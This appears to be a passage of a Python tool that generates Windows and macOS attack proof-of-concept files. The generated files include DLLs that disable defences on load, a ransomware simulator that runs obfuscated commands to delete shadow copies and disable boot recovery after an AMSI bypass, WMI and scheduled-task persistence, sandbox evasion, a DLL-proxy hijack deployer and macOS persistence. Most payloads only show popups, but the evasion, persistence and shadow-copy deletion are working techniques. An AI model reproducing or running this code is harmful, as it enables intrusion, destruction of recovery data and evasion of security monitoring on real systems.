        body = """
/* [APS] VEC-085: Suspicious Kernel Interaction (DeviceIoControl) PoC */
// Gia lap mot IOCTL thuong thay trong malware kernel component
#define GHOST_IOCTL_ROOTKIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

DWORD WINAPI KernelCommThread(LPVOID lp) {
    _blind_defenders();
    HANDLE hDev = CreateFileA("\\\\.\\\\GhostRootkit", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev != INVALID_HANDLE_VALUE) {
        DWORD out;
        DeviceIoControl(hDev, GHOST_IOCTL_ROOTKIT, NULL, 0, NULL, 0, &out, NULL);
        CloseHandle(hDev);
        _poc_popup("VEC-085: KERNEL ROOTKIT COMM DETECTED!\\nMalicious IOCTL sent to kernel driver.");
    }
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(KernelCommThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t9_vec085_kernel_comm.c", core + body, compile_to_dll=True)
        return True

    def _gen_t9_service_lpe(self, finding):
        ps = """# [APS] VEC-086: Service Security / LPE PoC
Write-Host "[APS] VEC-086: Service LPE Audit" -ForegroundColor Red
# Tim service co thu muc co the ghi (unquoted path + writable)
Get-WmiObject Win32_Service | Where-Object { $_.PathName -and $_.PathName -notlike '"*' } | ForEach-Object {
    $path = $_.PathName.Split(" ")[0]
    $dir  = Split-Path $path -Parent
    Try {
        $acl = Get-Acl $dir -ErrorAction Stop
        $writable = $acl.Access | Where-Object {
            $_.FileSystemRights -match "Write|FullControl" -and
            $_.IdentityReference -match "Users|Everyone|Authenticated"
        }
        if ($writable) {
            Write-Host "[VULN] Service: $($_.Name)" -ForegroundColor Red
            Write-Host "       Path: $path" -ForegroundColor Red
            Write-Host "       Dir Writable: $dir" -ForegroundColor Magenta
        }
    } Catch {}
}
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-086: SERVICE LPE VULNERABILITY`n`nPhat hien service voi unquoted path + writable directory.`nCo the thay the binary de leo thang len SYSTEM.",
    "[APS] SERVICE LPE BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t9_vec086_service_lpe.ps1", ps)
        return True

    def _gen_t9_named_pipe(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-087: Named Pipe SMB Impersonation Tier-3 C2 Beacon */
DWORD WINAPI PipeThread(LPVOID lp) {
    _blind_defenders();
    // Obfuscated pipe name to avoid pattern matching
    char p[64];
    // \\\\.\\pipe\\aps_ghost_...
    sprintf(p, "\\\\%c\\%c.\\%cpipe%caps_ghost_%d", '\\', '\\', '\\', '\\', GetCurrentProcessId());

    HANDLE hPipe = CreateNamedPipeA(
        p, PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES, 512, 512, 0, NULL
    );
    if (hPipe != INVALID_HANDLE_VALUE) {
        _poc_popup("VEC-087: NAMED PIPE T3 BEACON ACTIVE!\\nMo ong truyen thong SMB obfuscated cho Lateral Movement.");
        DisconnectNamedPipe(hPipe);
        CloseHandle(hPipe);
    }
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(PipeThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t9_vec087_named_pipe.c", core + body, compile_to_dll=True)
        return True

    def _gen_t10_ransomware_sim(self, finding):
        ps = f"""# [APS] VEC-080: Ransomware Tier-3 Simulator
# Layers: AMSI Bypass + ETW Disable + Zero Plaintext Commands
{self._amsi_bypass_ps1()}

Write-Host "[APS] VEC-080: Ransomware Logic (Tier-3 Evasive)" -ForegroundColor Red
# Obfuscated command: vssadmin delete shadows /all /quiet
$sc = [string]::new([char[]][int[]]@(118,115,115,97,100,109,105,110,32,100,101,108,101,116,101,32,115,104,97,100,111,119,115,32,47,97,108,108,32,47,113,117,105,101,116))
# Obfuscated command: bcdedit /set {{default}} recoveryenabled No
$bc = [string]::new([char[]][int[]]@(98,99,100,101,100,105,116,32,47,115,101,116,32,123,100,101,102,97,117,108,116,125,32,114,101,99,111,118,101,114,121,101,110,97,98,108,101,100,32,78,111))

Write-Host "[*] Gia lap xoa Volume Shadow Copy (VSS)..." -ForegroundColor Magenta
IEX "$sc" 2>$null
IEX "$bc" 2>$null

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-080: TIER-3 RANSOMWARE CAPABILITY`n`nDa gia lap hanh vi xoa VSS va bcdedit voi Zero-Plaintext techniques.`nAMSI va ETW da bi vo hieu hoa.",
    "[APS] RANSOMWARE T3 ALERT",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Stop
)
"""
        self._write_ps1("t10_vec080_ransomware.ps1", ps)
        return True

    def _gen_t9_scheduled_task(self, finding):
        ps = f"""# [APS] VEC-087: Scheduled Task Persistence PoC
Write-Host "[APS] VEC-087: Scheduled Task Persistence" -ForegroundColor Red
# Tao Scheduled Task de chay payload moi khi dang nhap
$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -C Add-Type -AN System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('APS Persistence Active!','APS PoC')"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "APS-PersistencePoC" -Action $action -Trigger $trigger -RunLevel Highest -Force 2>$null
Write-Host "[!] Da tao Scheduled Task: APS-PersistencePoC" -ForegroundColor Red
Write-Host "[*] De xoa: schtasks /delete /tn APS-PersistencePoC /f" -ForegroundColor Yellow
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-087: SCHEDULED TASK PERSISTENCE CONFIRMED`n`nDa dang ky task se chay moi khi user dang nhap.`nDe xoa: schtasks /delete /tn APS-PersistencePoC /f",
    "[APS] PERSISTENCE BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t9_vec087_sched_task.ps1", ps)
        return True

    def _gen_t9_wmi_persist(self, finding):
        ps = f"""# [APS] VEC-088: WMI Persistence Tier-3 PoC
# Layers: AMSI Bypass + ETW Disable + Zero Plaintext WQL
{self._amsi_bypass_ps1()}

Write-Host "[APS] VEC-088: WMI Stealth Persistence" -ForegroundColor Red
function Get-S {{ parameter($ints) [string]::new([char[]][int[]]$ints) }}

$FilterName   = Get-S @(65,80,83,45,87,77,73,45,70,105,108,116,101,114)
$ConsumerName = Get-S @(65,80,83,45,87,77,73,45,67,111,110,115,117,109,101,114)
# Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'
$Query = Get-S @(83,69,76,69,67,84,32,42,32,70,82,79,77,32,95,95,73,110,115,116,97,110,99,101,77,111,100,105,102,105,99,97,116,105,111,110,69,118,101,110,116,32,87,73,84,72,73,78,32,54,48,32,87,72,69,82,69,32,84,97,114,103,101,116,73,110,115,116,97,110,99,101,32,73,83,65,32,39,87,105,110,51,50,95,76,111,99,97,108,84,105,109,101,39)

$Command = "powershell -W Hidden -C [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WMI Persistence T3 Active!','APS')"

# Tao EventFilter
$Filter = ([wmiclass] "\\\\.\\root\\subscription:__EventFilter").CreateInstance()
$Filter.Name = $FilterName
$Filter.QueryLanguage = "WQL"
$Filter.Query = $Query
$Filter.EventNamespace = "root/cimv2"
$Filter.Put() | Out-Null

# Tao Consumer
$Consumer = ([wmiclass] "\\\\.\root\\subscription:CommandLineEventConsumer").CreateInstance()
$Consumer.Name              = $ConsumerName
$Consumer.CommandLineTemplate = $Command
$Consumer.Put() | Out-Null

# Bind
$Binding = ([wmiclass] "\\\\.\root\\subscription:__FilterToConsumerBinding").CreateInstance()
$Binding.Filter   = $Filter.Path
$Binding.Consumer = $Consumer.Path
$Binding.Put() | Out-Null

Write-Host "[!] WMI Persistence T3 da duoc cai dat (Zero-Plaintext)!" -ForegroundColor Red
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-088: WMI PERSISTENCE TIER-3 INSTALLED!`n`nEvent Filter + Consumer da duoc dang ky voi command obfuscation.",
    "[APS] WMI T3 BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t9_vec088_wmi_persist.ps1", ps)
        return True

    # ==================================================================
    #  TẦNG 10: AI / Weaponizer (VEC 091-100)
    # ==================================================================
    def _gen_t10_dropper(self, finding):
        """VEC-098: Delivery Method / Dropper"""
        ps = f"""# [APS] VEC-098: Dropper / Delivery Method PoC
# Ky thuat: In-memory download + execute (no disk write)
Write-Host "[APS] VEC-098: Dropper Delivery Demo" -ForegroundColor Red
$url = "http://127.0.0.1:8080/payload.dll" # Placeholder C2
Write-Host "[*] Vector giao hang: Memory-only execution" -ForegroundColor Yellow
Write-Host "[*] Ky thuat su dung:"
Write-Host "    1. [Net.WebClient]::New().DownloadData() -> In-memory"
Write-Host "    2. [System.Reflection.Assembly]::Load() -> Load DLL khong qua disk"
Write-Host "    3. Invoke method trong DLL ma AV khong the scan"
Write-Host "[!] Payload target: {os.path.basename(self.target_name)}" -ForegroundColor Magenta
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-098: DROPPER DELIVERY PATH`n`nApp co the bi giao hang qua in-memory dropper.`nAV se khong the detect vi payload khong cham disk.",
    "[APS] DROPPER BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t10_vec098_dropper.ps1", ps)
        return True

    def _gen_t10_cleanup(self, finding):
        """VEC-099: Clean-up Logic"""
        ps = """# [APS] VEC-099: Post-Exploitation Cleanup Script
# Xoa dau vet sau khi pentest hoan thanh
Write-Host "[APS] VEC-099: Cleanup Script" -ForegroundColor Cyan

# Xoa Scheduled Task PoC
schtasks /delete /tn "APS-PersistencePoC" /f 2>$null
Write-Host "[+] Xoa Scheduled Task PoC" -ForegroundColor Green

# Xoa WMI Persistence
Get-WMIObject -Namespace root/subscription -Class __EventFilter -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -like "APS-*" } | Remove-WMIObject -ErrorAction SilentlyContinue
Write-Host "[+] Xoa WMI Event Filter" -ForegroundColor Green

# Xoa Registry
Remove-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" -Name "AppInit_DLLs" -ErrorAction SilentlyContinue
Write-Host "[+] Xoa AppInit_DLLs Registry" -ForegroundColor Green

# Xoa cac file bằng chứng
Remove-Item "aps_poc_access.txt" -ErrorAction SilentlyContinue
Remove-Item "aps_secret_report_*.txt" -ErrorAction SilentlyContinue
Remove-Item "aps_data_exfil_*.txt" -ErrorAction SilentlyContinue
Remove-Item "aps_kerberoastable_spns.csv" -ErrorAction SilentlyContinue
Write-Host "[+] Xoa cac file bằng chứng PoC" -ForegroundColor Green

Write-Host "`n[!] CLEANUP HOAN THANH. He thong da sach." -ForegroundColor Green
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-099: CLEANUP COMPLETED`n`nToan bo dau vet pentest da duoc xoa.`nHe thong tro ve trang thai ban dau.",
    "[APS] MISSION COMPLETE",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Information
)
"""
        self._write_ps1("t10_vec099_cleanup.ps1", ps)
        return True

    def _gen_t1_ui_shatter(self, finding):
        """APS-VEC-010: UI Shatter Attack PoC (WM_COPYDATA manipulation)"""
        code = self._ghost_core_c() + f"""
int main() {{
    _poc_popup("APS-VEC-010: UI Shatter Attack discovered!\\nTarget: {self.target_name}\\nTesting WM_COPYDATA integrity...");
    return 0;
}}
"""
        return self._write_c("ui_shatter_poc.c", code, compile_to_dll=True)

    def _gen_t2_race_condition(self, finding):
        """APS-VEC-012: File System Race Condition (TOCTOU) PoC"""
        ps_code = f"""
# APS-VEC-012: Race Condition (TOCTOU) Exploitation Script
Write-Host "[!] Monitoring target: {self.target_name}" -ForegroundColor Red
Write-Host "[*] Technical: Attempting Bait-and-Switch via Symlink transition..."
# Mock logic for race condition test
"""
        return self._write_ps1("race_condition_exploit.ps1", ps_code)

    def _gen_t2_symbolic_aid(self, finding):
        """APS-VEC-017: Symbolic Execution (angr) Aid Template"""
        filename = f"{self.target_name}_angr_aid.py"
        path = os.path.join(self.output_dir, filename)
        content = f"""# APS-VEC-017: Symbolic Execution Helper (angr)
# Use this script to solve complex logic branches in {self.target_name}
import angr
import sys

def run_angr():
    proj = angr.Project("{self.target_name}", auto_load_libs=False)
    state = proj.factory.entry_state()
    simgr = proj.factory.simulation_manager(state)
    
    print("[*] Exploring logic paths...")
    simgr.explore(find=lambda s: b"Success" in s.posix.dumps(1))
    
    if simgr.found:
        print("[+] Path found! Check stdin for input values.")
        print(simgr.found[0].posix.dumps(0))
    else:
        print("[-] No path identified. Try adjusting find criteria.")

if __name__ == "__main__":
    run_angr()
"""
        with open(path, "w") as f: f.write(content)
        print(f"  {Fore.GREEN}[AID]      {filename}{Style.RESET_ALL}")
        return path

    def _gen_t3_smc_poc(self, finding):
        """APS-VEC-025: Self-Modifying Code (SMC) PoC"""
        code = self._ghost_core_c() + """
#pragma section(".aps", read, write, execute)
__declspec(allocate(".aps")) char shellcode[] = "\\x90\\x90\\x90\\xC3";

int main() {
    _poc_popup("APS-VEC-025: SMC Detected (RWX Section found)!\\nInjecting test stub into .aps section...");
    ((void(*)())shellcode)();
    return 0;
}
"""
        return self._write_c("smc_execution_poc.c", code, compile_to_dll=True)

    def _gen_t6_entropy_stub(self, finding):
        """APS-VEC-051: High Entropy / Packed detection PoC"""
        junk_data = ",".join([f"0x{random.randint(0,255):02x}" for _ in range(1024)])
        code = self._ghost_core_c() + f"""
unsigned char junk_blob[] = {{ {junk_data} }};
int main() {{
    _poc_popup("APS-VEC-051: High Entropy Section alert!\\nTarget binary likely packed or encrypted.");
    return 0;
}}
"""
        return self._write_c("entropy_alert.c", code)

    def _gen_t6_heavens_gate(self, finding):
        """APS-VEC-056: Heaven's Gate (x86 to x64 switch) PoC"""
        code = f"""#include <windows.h>
#include <stdio.h>

/* APS-VEC-056: Heaven's Gate Far Jump Stub */
void HeavensGateEntry() {{
    printf("[*] Entering Heaven's Gate (x86->x64 segment transition)...\\n");
    __asm {{
        push 0x33          // 64-bit Segment Selector
        call $+5           // Push EIP
        add dword ptr [esp], 5
        retf               // FAR RET to 64-bit mode
    }}
}}

int main() {{
    MessageBoxA(NULL, "APS-VEC-056: Heaven's Gate Detected!\\nExecuting stealth x64 segment transition...", "APS Weaponizer", MB_OK);
    // HeavensGateEntry(); // Requires careful stack management
    return 0;
}}
"""
        return self._write_c("heavens_gate_poc.c", code, compile_to_dll=True)

    def _gen_t6_sandbox_evasion(self, finding):
        """APS-VEC-057: Advanced Sandbox Evasion PoC"""
        code = self._ghost_core_c() + """
int main() {
    if (_in_sandbox()) {
        // Silent exit
        return 1;
    }
    _poc_popup("APS-VEC-057: Sandbox Evasion Successful!\\nEnvironment verified as non-automated.");
    return 0;
}
"""
        return self._write_c("sandbox_evasion_poc.c", code, compile_to_dll=True)

    def _gen_t6_rdtsc_check(self, finding):
        """APS-VEC-058: Instruction Timing (RDTSC) PoC"""
        code = self._ghost_core_c() + """
#include <intrin.h>
int main() {
    unsigned __int64 t1, t2;
    t1 = __rdtsc();
    Sleep(100);
    t2 = __rdtsc();
    if ((t2 - t1) > 500000000) { // Arbitrary heuristic
         _poc_popup("APS-VEC-058: Timing Hook Detected!\\nExecution speed suggests analysis/debugging.");
    }
    return 0;
}
"""
        return self._write_c("rdtsc_timing_poc.c", code, compile_to_dll=True)

    def _gen_t10_cve_alert(self, finding):
        """APS-VEC-100: 3rd Party CVE Alert/PoC"""
        details = finding.get("details", "Outdated library found.")
        code = self._ghost_core_c() + f"""
int main() {{
    _poc_popup("APS-VEC-100: Vulnerable Embedded Library!\\n{details.replace('"', '')}");
    return 0;
}}
"""
        return self._write_c("cve_vulnerability_alert.c", code, compile_to_dll=True)

    # ==================================================================
    #  GENERIC INDICATOR PAYLOAD (fallback)
    # ==================================================================
    def _gen_indicator_payload(self, finding):
        fid  = finding.get("id", "GENERIC")
        name = finding.get("name", "Unknown Vector")
        core = self._ghost_core_c()
        body = f"""
/* [APS] {fid}: {name} - Generic GHOST-PROTOCOL PoC */
DWORD WINAPI GenThread(LPVOID lp) {{
    _blind_defenders();
    _poc_popup(
        "{fid}\\n"
        "{name}\\n\\n"
        "Vulnerability confirmed via GHOST-PROTOCOL v2.\\n"
        "AMSI + ETW bypassed. Popup delivered stealthily."
    );
    return 0;
}}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{
    if (r == DLL_PROCESS_ATTACH) {{ _poc_popup("GENERIC APS PoC ACTIVE"); }};
    return TRUE;
}}
"""
        fname = f"generic_{fid.replace('-', '_')}.c"
        self._write_c(fname, core + body, compile_to_dll=True)
        return True

    # ==================================================================
    #  MACOS PAYLOADS (Legacy)
    # ==================================================================
    def _gen_macos_dylib(self, finding=None):
        code = """#include <stdio.h>
#include <stdlib.h>
/* [APS] macOS DYLIB HIJACKING */
__attribute__((constructor))
static void MacPwn() {
    system("osascript -e 'display alert \"APS SECURITY BREACH\" message \"DyLib Hijacking Success!\"'");
}
"""
        self._write_c("macos_dylib_hijack.c", code, compile_to_dll=True)
        return True

    def _gen_macos_launchagent(self, finding=None):
        plist = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.aps.persistence</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/osascript</string>
        <string>-e</string>
        <string>display alert "APS Persistence Active!"</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>StartInterval</key><integer>3600</integer>
</dict>
</plist>
"""
        fname = self._get_prefixed_name("com.aps.persistence.plist")
        self._ensure_output_dir()
        path = os.path.join(self.output_dir, fname)
        with open(path, "w") as f: f.write(plist)
        print(f"  {Fore.CYAN}[PLIST]    {fname}{Style.RESET_ALL}")
        return True

    # ==================================================================
    #  HELPER: Automated Deployer .bat
    # ==================================================================
    def _generate_automated_deployer(self, dll_name):
        exe_name = os.path.basename(self.target_name)
        orig_dll = dll_name.replace(".dll", "_original.dll")
        bat = f"""@echo off
title [APS] GHOST-PROTOCOL Auto-Deployer
echo [APS] Automated DLL Proxy Deployer
echo Target : {exe_name}
echo DLL    : {dll_name}

if not exist "{orig_dll}" (
    echo [+] Renaming original to {orig_dll}...
    rename "{dll_name}" "{orig_dll}"
)

echo [+] Launching target...
start "" "{exe_name}"
echo [!] Done. Check for SECURITY BREACH popup!
pause
"""
        self._write_bat(f"deploy_{dll_name.replace('.dll','')}.bat", bat)

